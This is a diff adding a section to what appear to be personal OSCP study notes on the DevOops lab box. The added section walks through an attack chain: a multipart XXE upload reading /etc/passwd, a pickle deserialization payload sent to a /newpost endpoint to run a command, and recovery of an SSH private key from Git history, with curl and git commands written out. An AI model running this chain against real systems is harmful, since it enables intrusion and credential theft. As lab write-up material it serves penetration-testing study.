@@ -216,6 +216,43 @@ ssh-keygen -y -f "$KeyFile"
 
 If the harmless entity resolves but the file does not, check the path and the web process's read permissions. If no field reflects output, move to an external DTD and watch the attacker HTTP server for a callback.
 
+## DevOops: why multipart XXE leads to pickle execution and Git-history credentials
+
+The chain works because each result changes the next test. The form identifies the parser input, the safe file proves entity expansion, source disclosure reveals the deserializer, and local enumeration exposes a repository that may retain deleted credentials.
+
+```bash
+boxset UploadURL "http://$BoxIP:$WebPort/upload"
+boxset FileField "file"
+curl -sS -F "$FileField=@$BoxDir/exploits/xxe-passwd.xml;filename=feed.xml" \
+  "$UploadURL" | tee "$BoxDir/loot/xxe-passwd.txt"
+
+boxset PickleURL "http://$BoxIP:$WebPort/newpost"
+Payload="$(python3 "$BoxDir/exploits/mkpickle.py" id)"
+curl -sS -X POST --data-binary "$Payload" \
+  -H 'Content-Type: application/octet-stream' "$PickleURL" \
+  | tee "$BoxDir/loot/pickle-id.txt"
+
+git -C "$GitRepo" log --oneline --all
+git -C "$GitRepo" show "$Commit:$HistoryPath" > "$HistoryKeyFile"
+chmod 600 "$HistoryKeyFile"
+ssh-keygen -y -f "$HistoryKeyFile" > /dev/null
+```
+
+Piece by piece:
+
+- `-F "$FileField=@..."` sends the XML through the form's real multipart field. Posting raw XML would test a different parser path or fail before parsing.
+- `file:///etc/passwd` is a predictable, low-sensitivity proof. Interactive usernames then provide candidate home paths for source review.
+- `pickle.loads()` reconstructs objects and can invoke the callable returned by `__reduce__`. A protocol-2 URL-safe payload matches the disclosed decoder.
+- `id` proves execution through the existing response and avoids introducing callback quoting before the vulnerability is understood.
+- `git log --all` searches reachable history, not only the working tree. `git show "$Commit:$HistoryPath"` retrieves the exact historical blob without printing it.
+- `ssh-keygen -y` validates that the mechanically extracted key is complete before one controlled authentication test.
+
+Where to look in the response: reflected `/etc/passwd` lines prove XXE, `pickle.loads` and `base64` prove the source path, `uid=` proves command execution, and the Git log's key or integration commit identifies the history branch.
+
+Where this comes from: [[OSCP/BOXES/WRITE UPS/Linux/DevOops|DevOops]], the Python `pickle` documentation, and Git's `log` and `show` documentation.
+
+🔁 **Seen in:** [[OSCP/BOXES/WRITE UPS/Linux/DevOops|DevOops]]
+
 ## External Resources
 
 - [HackTricks - XXE](https://hacktricks.wiki/en/pentesting-web/xxe-xee-xml-external-entity.html)
@@ -240,6 +277,7 @@ This page turns one repeatable part of an authorized assessment into a checklist
 ## Demonstrated in box write-ups
 
 - [[OSCP/BOXES/WRITE UPS/Linux/Sea|Sea]] -- demonstrates the workflow described here
+- [[OSCP/BOXES/WRITE UPS/Linux/DevOops|DevOops]] -- demonstrates multipart XXE, unsafe pickle proof, and Git-history credential analysis
 
 ## Knife: why `User-Agentt` is the important header
 
